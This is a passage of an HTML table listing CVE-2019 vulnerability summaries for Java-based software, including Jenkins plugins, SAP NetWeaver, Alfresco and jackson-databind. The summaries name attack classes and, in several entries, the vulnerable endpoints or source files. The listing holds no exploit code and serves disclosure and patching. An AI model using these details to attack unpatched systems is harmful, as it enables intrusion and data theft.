		<td valign="top">In Snowtide PDFxStream before 3.7.1 (for Java), a crafted PDF file can trigger an extremely long running computation because of page-tree mishandling.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-16941">CVE-2019-16941</a></td>
		<td valign="top">NSA Ghidra through 9.0.4, when experimental mode is enabled, allows arbitrary code execution if the Read XML Files feature of Bit Patterns Explorer is used with a modified XML document. This occurs in Features/BytePatterns/src/main/java/ghidra/bitpatterns/info/FileBitPatternInfoReader.java. An attack could start with an XML document that was originally created by DumpFunctionPatternInfoScript but then directly modified by an attacker (for example, to make a java.lang.Runtime.exec call).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-16112">CVE-2019-16112</a></td>
		<td valign="top">TylerTech Eagle 2018.3.11 deserializes untrusted user input, resulting in remote code execution via a crafted Java object to the recorder/ServiceManager?service=tyler.empire.settings.SettingManager URI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-14224">CVE-2019-14224</a></td>
		<td valign="top">An issue was discovered in Alfresco Community Edition 5.2 201707. By leveraging multiple components in the Alfresco Software applications, an exploit chain was observed that allows an attacker to achieve remote code execution on the victim machine. The attacker must upload malicious Solr configuration files and then receive a JMX connection from the victim, and serve a Java object that results in deserialization and code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-14222">CVE-2019-14222</a></td>
		<td valign="top">An issue was discovered in Alfresco Community Edition versions 6.0 and lower. An unauthenticated, remote attacker could authenticate to Alfresco's Solr Web Admin Interface. The vulnerability is due to the presence of a default private key that is present in all default installations. An attacker could exploit this vulnerability by using the extracted private key and bundling it into a PKCS12. A successful exploit could allow the attacker to gain information about the target system (e.g., OS type, system file locations, Java version, Solr version, etc.) as well as the ability to launch further attacks by leveraging the access to Alfresco's Solr Web Admin Interface.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-13624">CVE-2019-13624</a></td>
		<td valign="top">In ONOS 1.15.0, apps/yang/web/src/main/java/org/onosproject/yang/web/YangWebResource.java mishandles backquote characters within strings that can be used in a shell command.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-13116">CVE-2019-13116</a></td>
		<td valign="top">The MuleSoft Mule Community Edition runtime engine before 3.8 allows remote attackers to execute arbitrary code because of Java Deserialization, related to Apache Commons Collections

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-13022">CVE-2019-13022</a></td>
		<td valign="top">Bond JetSelect (all versions) has an issue in the Java class (ENCtool.jar) and corresponding password generation algorithm (used to set initial passwords upon first installation). It XORs the plaintext into the 'encrypted' password that is then stored within the database. These steps are able to be trivially reversed, allowing for escalation of privilege within the JetSelect application through obtaining the passwords of JetSelect administrators. JetSelect administrators have the ability to modify and delete all networking configuration across a vessel, as well as altering network configuration of all managed network devices (switches, routers).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-12837">CVE-2019-12837</a></td>
		<td valign="top">The Java API in accesuniversitat.gencat.cat 1.7.5 allows remote attackers to get personal information of all registered students via several API endpoints.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-12630">CVE-2019-12630</a></td>
		<td valign="top">A vulnerability in the Java deserialization function used by Cisco Security Manager could allow an unauthenticated, remote attacker to execute arbitrary commands on an affected device. The vulnerability is due to insecure deserialization of user-supplied content by the affected software. An attacker could exploit this vulnerability by sending a malicious serialized Java object to a specific listener on an affected system. A successful exploit could allow the attacker to execute arbitrary commands on the device with the privileges of casuser.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-12400">CVE-2019-12400</a></td>
		<td valign="top">In version 2.0.3 Apache Santuario XML Security for Java, a caching mechanism was introduced to speed up creating new XML documents using a static pool of DocumentBuilders. However, if some untrusted code can register a malicious implementation with the thread context class loader first, then this implementation might be cached and re-used by Apache Santuario - XML Security for Java, leading to potential security flaws when validating signed documents, etc. The vulnerability affects Apache Santuario - XML Security for Java 2.0.x releases from 2.0.3 and all 2.1.x releases before 2.1.4.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-12180">CVE-2019-12180</a></td>
		<td valign="top">An issue was discovered in SmartBear ReadyAPI through 2.8.2 and 3.0.0 and SoapUI through 5.5. When opening a project, the Groovy "Load Script" is automatically executed. This allows an attacker to execute arbitrary Groovy Language code (Java scripting language) on the victim machine by inducing it to open a malicious Project. The same issue is present in the "Save Script" function, which is executed automatically when saving a project.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-12086">CVE-2019-12086</a></td>
		<td valign="top">A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x before 2.9.9. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint, the service has the mysql-connector-java jar (8.0.14 or earlier) in the classpath, and an attacker can host a crafted MySQL server reachable by the victim, an attacker can send a crafted JSON message that allows them to read arbitrary local files on the server. This occurs because of missing com.mysql.cj.jdbc.admin.MiniAdmin validation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-12017">CVE-2019-12017</a></td>
		<td valign="top">A remote code execution vulnerability exists in MapR CLDB code, specifically in the JSON framework that is used in the CLDB code that handles login and ticket issuance. An attacker can use the 'class' property of the JSON request sent to the CLDB to influence the JSON library's decision on which Java class this JSON request is deserialized to. By doing so, the attacker can force the MapR CLDB to construct a URLClassLoader which loads a malicious Java class from a remote path and instantiate this object in the MapR CLDB, thus executing arbitrary code on the machine running the MapR CLDB and take over the cluster. By switching to the newer Jackson library and ensuring that all incoming JSON requests are only deserialized to the same class that it was serialized from, the vulnerability is fixed. This vulnerability affects the entire MapR core platform.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-11938">CVE-2019-11938</a></td>
		<td valign="top">Java Facebook Thrift servers would not error upon receiving messages declaring containers of sizes larger than the payload. As a result, malicious clients could send short messages which would result in a large memory allocation, potentially leading to denial of service. This issue affects Facebook Thrift prior to v2019.12.09.00.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-11777">CVE-2019-11777</a></td>
		<td valign="top">In the Eclipse Paho Java client library version 1.2.0, when connecting to an MQTT server using TLS and setting a host name verifier, the result of that verification is not checked. This could allow one MQTT server to impersonate another and provide the client library with incorrect information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-11772">CVE-2019-11772</a></td>
		<td valign="top">In Eclipse OpenJ9 prior to 0.15, the String.getBytes(int, int, byte[], int) method does not verify that the provided byte array is non-null nor that the provided index is in bounds when compiled by the JIT. This allows arbitrary writes to any 32-bit address or beyond the end of a byte array within Java code run under a SecurityManager.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-11696">CVE-2019-11696</a></td>
		<td valign="top">Files with the .JNLP extension used for "Java web start" applications are not treated as executable content for download prompts even though they can be executed if Java is installed on the local system. This could allow users to mistakenly launch an executable binary locally. This vulnerability affects Firefox &lt; 67.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-11642">CVE-2019-11642</a></td>
		<td valign="top">A log poisoning vulnerability has been discovered in the OneShield Policy (Dragon Core) framework before 5.1.10. Authenticated remote adversaries can poison log files by entering malicious payloads in either headers or form elements. These payloads are then executed via a client side debugging console. This is predicated on the debugging console and Java Bean being made available to the deployed application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-10352">CVE-2019-10352</a></td>
		<td valign="top">A path traversal vulnerability in Jenkins 2.185 and earlier, LTS 2.176.1 and earlier in core/src/main/java/hudson/model/FileParameterValue.java allowed attackers with Job/Configure permission to define a file parameter with a file name outside the intended directory, resulting in an arbitrary file write on the Jenkins master when scheduling a build.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-10257">CVE-2019-10257</a></td>
		<td valign="top">Zucchetti HR Portal through 2019-03-15 allows Directory Traversal. Unauthenticated users can escape outside of the restricted location (dot-dot-slash notation) to access files or directories that are elsewhere on the system. Through this vulnerability it is possible to read the application's java sources from /WEB-INF/classes/*.class

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-10245">CVE-2019-10245</a></td>
		<td valign="top">In Eclipse OpenJ9 prior to the 0.14.0 release, the Java bytecode verifier incorrectly allows a method to execute past the end of bytecode array causing crashes. Eclipse OpenJ9 v0.14.0 correctly detects this case and rejects the attempted class load.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1010245">CVE-2019-1010245</a></td>
		<td valign="top">The Linux Foundation ONOS SDN Controller 1.15 and earlier versions is affected by: Improper Input Validation. The impact is: A remote attacker can execute arbitrary commands on the controller. The component is: apps/yang/src/main/java/org/onosproject/yang/impl/YangLiveCompilerManager.java. The attack vector is: network connectivity. The fixed version is: 1.15.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1010202">CVE-2019-1010202</a></td>
		<td valign="top">Jeesite 1.2.7 is affected by: XML External Entity (XXE). The impact is: sensitive information disclosure. The component is: convertToModel() function in src/main/java/com.thinkgem.jeesite/modules/act/service/ActProcessService.java. The attack vector is: network connectivity,authenticated,must upload a specially crafted xml file. The fixed version is: 4.0 and later.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1010201">CVE-2019-1010201</a></td>
		<td valign="top">Jeesite 1.2.7 is affected by: SQL Injection. The impact is: sensitive information disclosure. The component is: updateProcInsIdByBusinessId() function in src/main/java/com.thinkgem.jeesite/modules/act/ActDao.java has SQL Injection vulnerability. The attack vector is: network connectivity,authenticated. The fixed version is: 4.0 and later.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-10086">CVE-2019-10086</a></td>
		<td valign="top">In Apache Commons Beanutils 1.9.2, a special BeanIntrospector class was added which allows suppressing the ability for an attacker to access the classloader via the class property available on all Java objects. We, however were not using this by default characteristic of the PropertyUtilsBean.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-10080">CVE-2019-10080</a></td>
		<td valign="top">The XMLFileLookupService in NiFi versions 1.3.0 to 1.9.2 allowed trusted users to inadvertently configure a potentially malicious XML file. The XML file has the ability to make external calls to services (via XXE) and reveal information such as the versions of Java, Jersey, and Apache that the NiFI instance uses.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003039">CVE-2019-1003039</a></td>
		<td valign="top">An insufficiently protected credentials vulnerability exists in JenkinsAppDynamics Dashboard Plugin 1.0.14 and earlier in src/main/java/nl/codecentric/jenkins/appd/AppDynamicsResultsPublisher.java that allows attackers without permission to obtain passwords configured in jobs to obtain them.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003038">CVE-2019-1003038</a></td>
		<td valign="top">An insufficiently protected credentials vulnerability exists in Jenkins Repository Connector Plugin 1.2.4 and earlier in src/main/java/org/jvnet/hudson/plugins/repositoryconnector/ArtifactDeployer.java, src/main/java/org/jvnet/hudson/plugins/repositoryconnector/Repository.java, src/main/java/org/jvnet/hudson/plugins/repositoryconnector/UserPwd.java that allows an attacker with local file system access or control of a Jenkins administrator's web browser (e.g. malicious extension) to retrieve the password stored in the plugin configuration.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003037">CVE-2019-1003037</a></td>
		<td valign="top">An information exposure vulnerability exists in Jenkins Azure VM Agents Plugin 0.8.0 and earlier in src/main/java/com/microsoft/azure/vmagent/AzureVMCloud.java that allows attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003036">CVE-2019-1003036</a></td>
		<td valign="top">A data modification vulnerability exists in Jenkins Azure VM Agents Plugin 0.8.0 and earlier in src/main/java/com/microsoft/azure/vmagent/AzureVMAgent.java that allows attackers with Overall/Read permission to attach a public IP address to an Azure VM agent.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003035">CVE-2019-1003035</a></td>
		<td valign="top">An information exposure vulnerability exists in Jenkins Azure VM Agents Plugin 0.8.0 and earlier in src/main/java/com/microsoft/azure/vmagent/AzureVMAgentTemplate.java, src/main/java/com/microsoft/azure/vmagent/AzureVMCloud.java that allows attackers with Overall/Read permission to perform the 'verify configuration' form validation action, thereby obtaining limited information about the Azure configuration.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003033">CVE-2019-1003033</a></td>
		<td valign="top">A sandbox bypass vulnerability exists in Jenkins Groovy Plugin 2.1 and earlier in pom.xml, src/main/java/hudson/plugins/groovy/StringScriptSource.java that allows attackers with Overall/Read permission to execute arbitrary code on the Jenkins master JVM.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003032">CVE-2019-1003032</a></td>
		<td valign="top">A sandbox bypass vulnerability exists in Jenkins Email Extension Plugin 2.64 and earlier in pom.xml, src/main/java/hudson/plugins/emailext/ExtendedEmailPublisher.java, src/main/java/hudson/plugins/emailext/plugins/content/EmailExtScript.java, src/main/java/hudson/plugins/emailext/plugins/content/ScriptContent.java, src/main/java/hudson/plugins/emailext/plugins/trigger/AbstractScriptTrigger.java that allows attackers with Job/Configure permission to execute arbitrary code on the Jenkins master JVM.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003031">CVE-2019-1003031</a></td>
		<td valign="top">A sandbox bypass vulnerability exists in Jenkins Matrix Project Plugin 1.13 and earlier in pom.xml, src/main/java/hudson/matrix/FilterScript.java that allows attackers with Job/Configure permission to execute arbitrary code on the Jenkins master JVM.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003030">CVE-2019-1003030</a></td>
		<td valign="top">A sandbox bypass vulnerability exists in Jenkins Pipeline: Groovy Plugin 2.63 and earlier in pom.xml, src/main/java/org/jenkinsci/plugins/workflow/cps/CpsGroovyShell.java that allows attackers able to control pipeline scripts to execute arbitrary code on the Jenkins master JVM.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003029">CVE-2019-1003029</a></td>
		<td valign="top">A sandbox bypass vulnerability exists in Jenkins Script Security Plugin 1.53 and earlier in src/main/java/org/jenkinsci/plugins/scriptsecurity/sandbox/groovy/GroovySandbox.java, src/main/java/org/jenkinsci/plugins/scriptsecurity/sandbox/groovy/SecureGroovyScript.java that allows attackers with Overall/Read permission to execute arbitrary code on the Jenkins master JVM.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003023">CVE-2019-1003023</a></td>
		<td valign="top">A cross-site scripting vulnerability exists in Jenkins Warnings Next Generation Plugin 1.0.1 and earlier in src/main/java/io/jenkins/plugins/analysis/core/model/DetailsTableModel.java, src/main/java/io/jenkins/plugins/analysis/core/model/SourceDetail.java, src/main/java/io/jenkins/plugins/analysis/core/model/SourcePrinter.java, src/main/java/io/jenkins/plugins/analysis/core/util/Sanitizer.java, src/main/java/io/jenkins/plugins/analysis/warnings/DuplicateCodeScanner.java that allows attackers with the ability to control warnings parser input to have Jenkins render arbitrary HTML.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003016">CVE-2019-1003016</a></td>
		<td valign="top">An exposure of sensitive information vulnerability exists in Jenkins Job Import Plugin 2.1 and earlier in src/main/java/org/jenkins/ci/plugins/jobimport/JobImportAction.java, src/main/java/org/jenkins/ci/plugins/jobimport/JobImportGlobalConfig.java, src/main/java/org/jenkins/ci/plugins/jobimport/model/JenkinsSite.java that allows attackers with Overall/Read permission to have Jenkins connect to an attacker-specified URL using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003015">CVE-2019-1003015</a></td>
		<td valign="top">An XML external entity processing vulnerability exists in Jenkins Job Import Plugin 2.1 and earlier in src/main/java/org/jenkins/ci/plugins/jobimport/client/RestApiClient.java that allows attackers with the ability to control the HTTP server (Jenkins) queried in preparation of job import to read arbitrary files, perform a denial of service attack, etc.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003013">CVE-2019-1003013</a></td>
		<td valign="top">An cross-site scripting vulnerability exists in Jenkins Blue Ocean Plugins 1.10.1 and earlier in blueocean-commons/src/main/java/io/jenkins/blueocean/commons/stapler/Export.java, blueocean-commons/src/main/java/io/jenkins/blueocean/commons/stapler/export/ExportConfig.java, blueocean-commons/src/main/java/io/jenkins/blueocean/commons/stapler/export/JSONDataWriter.java, blueocean-rest-impl/src/main/java/io/jenkins/blueocean/service/embedded/UserStatePreloader.java, blueocean-web/src/main/resources/io/jenkins/blueocean/PageStatePreloadDecorator/header.jelly that allows attackers with permission to edit a user's description in Jenkins to have Blue Ocean render arbitrary HTML when using it as that user.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003012">CVE-2019-1003012</a></td>
		<td valign="top">A data modification vulnerability exists in Jenkins Blue Ocean Plugins 1.10.1 and earlier in blueocean-core-js/src/js/bundleStartup.js, blueocean-core-js/src/js/fetch.ts, blueocean-core-js/src/js/i18n/i18n.js, blueocean-core-js/src/js/urlconfig.js, blueocean-rest/src/main/java/io/jenkins/blueocean/rest/APICrumbExclusion.java, blueocean-web/src/main/java/io/jenkins/blueocean/BlueOceanUI.java, blueocean-web/src/main/resources/io/jenkins/blueocean/BlueOceanUI/index.jelly that allows attackers to bypass all cross-site request forgery protection in Blue Ocean API.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003011">CVE-2019-1003011</a></td>
		<td valign="top">An information exposure and denial of service vulnerability exists in Jenkins Token Macro Plugin 2.5 and earlier in src/main/java/org/jenkinsci/plugins/tokenmacro/Parser.java, src/main/java/org/jenkinsci/plugins/tokenmacro/TokenMacro.java, src/main/java/org/jenkinsci/plugins/tokenmacro/impl/AbstractChangesSinceMacro.java, src/main/java/org/jenkinsci/plugins/tokenmacro/impl/ChangesSinceLastBuildMacro.java, src/main/java/org/jenkinsci/plugins/tokenmacro/impl/ProjectUrlMacro.java that allows attackers with the ability to control token macro input (such as SCM changelogs) to define recursive input that results in unexpected macro evaluation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003010">CVE-2019-1003010</a></td>
		<td valign="top">A cross-site request forgery vulnerability exists in Jenkins Git Plugin 3.9.1 and earlier in src/main/java/hudson/plugins/git/GitTagAction.java that allows attackers to create a Git tag in a workspace and attach corresponding metadata to a build record.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003009">CVE-2019-1003009</a></td>
		<td valign="top">An improper certificate validation vulnerability exists in Jenkins Active Directory Plugin 2.10 and earlier in src/main/java/hudson/plugins/active_directory/ActiveDirectoryDomain.java, src/main/java/hudson/plugins/active_directory/ActiveDirectorySecurityRealm.java, src/main/java/hudson/plugins/active_directory/ActiveDirectoryUnixAuthenticationProvider.java that allows attackers to impersonate the Active Directory server Jenkins connects to for authentication if Jenkins is configured to use StartTLS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003008">CVE-2019-1003008</a></td>
		<td valign="top">A cross-site request forgery vulnerability exists in Jenkins Warnings Next Generation Plugin 2.1.1 and earlier in src/main/java/io/jenkins/plugins/analysis/warnings/groovy/GroovyParser.java that allows attackers to execute arbitrary code via a form validation HTTP endpoint.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003007">CVE-2019-1003007</a></td>
		<td valign="top">A cross-site request forgery vulnerability exists in Jenkins Warnings Plugin 5.0.0 and earlier in src/main/java/hudson/plugins/warnings/GroovyParser.java that allows attackers to execute arbitrary code via a form validation HTTP endpoint.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003006">CVE-2019-1003006</a></td>
		<td valign="top">A sandbox bypass vulnerability exists in Jenkins Groovy Plugin 2.0 and earlier in src/main/java/hudson/plugins/groovy/StringScriptSource.java that allows attackers with Overall/Read permission to provide a Groovy script to an HTTP endpoint that can result in arbitrary code execution on the Jenkins master JVM.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003005">CVE-2019-1003005</a></td>
		<td valign="top">A sandbox bypass vulnerability exists in Jenkins Script Security Plugin 1.50 and earlier in src/main/java/org/jenkinsci/plugins/scriptsecurity/sandbox/groovy/SecureGroovyScript.java that allows attackers with Overall/Read permission to provide a Groovy script to an HTTP endpoint that can result in arbitrary code execution on the Jenkins master JVM.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003004">CVE-2019-1003004</a></td>
		<td valign="top">An improper authorization vulnerability exists in Jenkins 2.158 and earlier, LTS 2.150.1 and earlier in core/src/main/java/hudson/security/AuthenticationProcessingFilter2.java that allows attackers to extend the duration of active HTTP sessions indefinitely even though the user account may have been deleted in the mean time.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003003">CVE-2019-1003003</a></td>
		<td valign="top">An improper authorization vulnerability exists in Jenkins 2.158 and earlier, LTS 2.150.1 and earlier in core/src/main/java/hudson/security/TokenBasedRememberMeServices2.java that allows attackers with Overall/RunScripts permission to craft Remember Me cookies that would never expire, allowing e.g. to persist access to temporarily compromised user accounts.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003001">CVE-2019-1003001</a></td>
		<td valign="top">A sandbox bypass vulnerability exists in Pipeline: Groovy Plugin 2.61 and earlier in src/main/java/org/jenkinsci/plugins/workflow/cps/CpsFlowDefinition.java, src/main/java/org/jenkinsci/plugins/workflow/cps/CpsGroovyShellFactory.java that allows attackers with Overall/Read permission to provide a pipeline script to an HTTP endpoint that can result in arbitrary code execution on the Jenkins master JVM.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-1003000">CVE-2019-1003000</a></td>
		<td valign="top">A sandbox bypass vulnerability exists in Script Security Plugin 1.49 and earlier in src/main/java/org/jenkinsci/plugins/scriptsecurity/sandbox/groovy/GroovySandbox.java that allows attackers with the ability to provide sandboxed scripts to execute arbitrary code on the Jenkins master JVM.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0741">CVE-2019-0741</a></td>
		<td valign="top">An information disclosure vulnerability exists in the way Azure IoT Java SDK logs sensitive information, aka 'Azure IoT Java SDK Information Disclosure Vulnerability'.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0729">CVE-2019-0729</a></td>
		<td valign="top">An Elevation of Privilege vulnerability exists in the way Azure IoT Java SDK generates symmetric keys for encryption, allowing an attacker to predict the randomness of the key, aka 'Azure IoT Java SDK Elevation of Privilege Vulnerability'.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0391">CVE-2019-0391</a></td>
		<td valign="top">Under certain conditions SAP NetWeaver AS Java (corrected in 7.10, 7.20, 7.30, 7.31, 7.40, 7.50) allows an attacker to access information which would otherwise be restricted.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0389">CVE-2019-0389</a></td>
		<td valign="top">An administrator of SAP NetWeaver Application Server Java (J2EE-Framework), (corrected in versions 7.1, 7.2, 7.3, 7.31, 7.4, 7.5), may change privileges for all or some functions in Java Server, and enable users to execute functions, they are not allowed to execute otherwise.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0365">CVE-2019-0365</a></td>
		<td valign="top">SAP Kernel (RFC), KRNL32NUC, KRNL32UC and KRNL64NUC before versions 7.21, 7.21EXT, 7.22, 7.22EXT, KRNL64UC, before versions 7.21, 7.21EXT, 7.22, 7.22EXT, 7.49, 7.73 and KERNEL before versions 7.21, 7.49, 7.53, 7.73, 7.76 SAP GUI for Windows (BC-FES-GUI) before versions 7.5, 7.6, and SAP GUI for Java (BC-FES-JAV) before version 7.5, allow an attacker to prevent legitimate users from accessing a service, either by crashing or flooding the service.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0355">CVE-2019-0355</a></td>
		<td valign="top">SAP NetWeaver Application Server Java Web Container, ENGINEAPI (before versions 7.10, 7.20, 7.30, 7.31, 7.40, 7.50) and SAP-JEECOR (before versions 6.40, 7.0, 7.01), allows an attacker to inject code that can be executed by the application. An attacker could thereby control the behaviour of the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0345">CVE-2019-0345</a></td>
		<td valign="top">A remote unauthenticated attacker can abuse a web service in SAP NetWeaver Application Server for Java (Administrator System Overview), versions 7.30, 7.31, 7.40, 7.50, by sending a specially crafted XML file and trick the application server into leaking authentication credentials for its own SAP Management console, resulting in Server-Side Request Forgery.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0337">CVE-2019-0337</a></td>
		<td valign="top">Java Proxy Runtime of SAP NetWeaver Process Integration, versions 7.10, 7.11, 7.30, 7.31, 7.40, 7.50, does not sufficiently encode user-controlled inputs and allows an attacker to execute malicious scripts in the url thereby resulting in Reflected Cross-Site Scripting (XSS) vulnerability

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0327">CVE-2019-0327</a></td>
		<td valign="top">SAP NetWeaver for Java Application Server - Web Container, (engineapi, versions 7.1, 7.2, 7.3, 7.31, 7.4 and 7.5), (servercode, versions 7.2, 7.3, 7.31, 7.4, 7.5), allows an attacker to upload files (including script files) without proper file format validation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0318">CVE-2019-0318</a></td>
		<td valign="top">Under certain conditions SAP NetWeaver Application Server for Java (Startup Framework), versions 7.21, 7.22, 7.45, 7.49, and 7.53, allows an attacker to access information which would otherwise be restricted.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0305">CVE-2019-0305</a></td>
		<td valign="top">Java Server Pages (JSPs) provided by the SAP NetWeaver Process Integration (SAP_XIESR and SAP_XITOOL: 7.10 to 7.11, 7.20, 7.30, 7.31, 7.40, 7.50) do not restrict or incorrectly restrict frame objects or UI layers that belong to another application or domain, resulting in Clickjacking vulnerability. Successful exploitation of this vulnerability leads to unwanted modification of user's data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0282">CVE-2019-0282</a></td>
		<td valign="top">Several web pages in SAP NetWeaver Process Integration (Runtime Workbench), fixed in versions 7.10 to 7.11, 7.30, 7.31, 7.40, 7.50; can be accessed without user authentication, which might expose internal data like release information, Java package and Java object names which can be misused by the attacker.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-0275">CVE-2019-0275</a></td>
